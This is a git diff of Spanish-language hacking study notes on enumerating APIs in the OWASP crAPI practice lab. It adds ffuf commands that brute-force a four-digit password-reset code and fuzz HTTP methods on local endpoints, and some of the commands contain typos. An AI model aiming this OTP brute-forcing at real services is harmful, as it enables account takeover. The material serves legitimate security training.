@@ -1,4 +1,4 @@
-- Tags : #apis #potsman #recursos_github 
+- Tags : #apis #potsman #recursos_github #ffuf 
 
 **Actualización 24/05/2023**: Si a la hora de desplegar el laboratorio con Docker, os encontráis con problemas y alguno de los contenedores que se despliegan véis que causan error, probad a desplegar como alternativa el laboratorio de desarrollo.
 
@@ -35,3 +35,24 @@ Los desarrolladores pueden utilizar herramientas como Postman para probar la API
 A continuación, se proporciona el enlace al proyecto de Github que utilizamos para desplegar con Docker el laboratorio vulnerable donde poder practicar la enumeración de APIs:
 
 - **crAPI**: [https://github.com/OWASP/crAPI](https://github.com/OWASP/crAPI)
+
+```bash
+ffuf -u http//localhost:8888/identity/api/auth/v3/check-opt -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -X POST -d {"email":"savitar@hack4you.com", "opt":"FUZZ", "password":"Newpass1234"} -H "Content-Type: application/json" -p 1 -mc 200
+
+--Historial--
+-X  POST #Indica el metodo http
+-u       #Indica la url
+-w       #Indica el diccionario a utilizar
+-d       #Indica la data a enviar por parametro en peticiones POST
+-p       #Indica intervalo de tiempo entre peticiones
+-mc      #Match HTTP status codes, or "all" for everything. (default: 200-299,301,302,307,401,403,405,500)
+```
+
+Hacer fuzz para determinar los métodos disponibles en la api , utilizaremos otro diccionario de la seclist.  Es recomendable probar si una petición se puede realizar por diferentes métodos e incluso si la petición a la api tiene habilitada otras versiones activas, en los campos de valor introducir numeros negativos para ver que ocurre a nivel de aplicacion
+```bash
+locate \*method\* | grep -i seclist
+/usr/share/seclists/Fuzzing/http-request-methods.txt
+/usr/share/seclists/Fuzzing/php-magic-methods.txt
+
+ffuf -u http//localhost:8888/workshop/api/shop/products -w /usr/share/seclists/Fuzzing/http-request-methods.txt -X FUZZ -p 1 -mc 200,401
+```
